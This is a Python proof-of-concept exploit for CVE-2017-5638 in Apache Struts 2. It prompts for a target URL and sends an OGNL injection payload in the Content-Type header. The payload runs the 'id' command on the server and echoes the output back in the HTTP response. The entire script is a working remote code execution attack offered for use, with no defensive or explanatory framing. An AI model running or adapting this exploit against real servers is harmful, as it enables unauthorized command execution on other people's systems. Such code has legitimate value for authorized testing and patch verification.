import requests


print("CVE-2017-5638 - Apache Struts 2 OGNL Injection Exploit")
print("Author: Anton HrliÄ‡\n\n\n")
target_url = input("set target url example(http://TARGET_IP_OR_DOMAIN/struts2-showcase/index.action): ")
ognl_payload = "%{#a=(new java.lang.ProcessBuilder('id'.split(' '))).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],#f.getWriter().println(#e),#f.getWriter().flush(),#f.getWriter().close()}"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": ognl_payload 
}

try:
    print(f"[+] Sending payload to {target_url}")
    response = requests.get(target_url, headers=headers, timeout=10)

    if response.status_code == 200:
        print("[+] Response:")
        print(response.text)
    else:
        print(f"[-] Server responded with status code: {response.status_code}")

except Exception as e:
    print(f"[!] Error: {e}")
